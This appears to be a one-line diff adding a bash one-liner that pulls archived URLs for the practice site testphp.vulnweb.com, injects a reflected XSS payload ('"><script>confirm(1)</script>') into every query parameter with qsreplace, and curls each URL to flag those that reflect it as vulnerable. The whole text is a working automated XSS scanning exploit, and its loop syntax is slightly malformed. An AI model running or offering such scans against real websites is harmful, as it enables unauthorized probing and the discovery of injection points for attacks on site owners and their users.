@@ -1,0 +1,1 @@
+waybackurls testphp.vulnweb.com | tee testphp1.txt |  qsreplace '"><script>confirm(1)</script>' | tee  combinedfuzz.json  && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
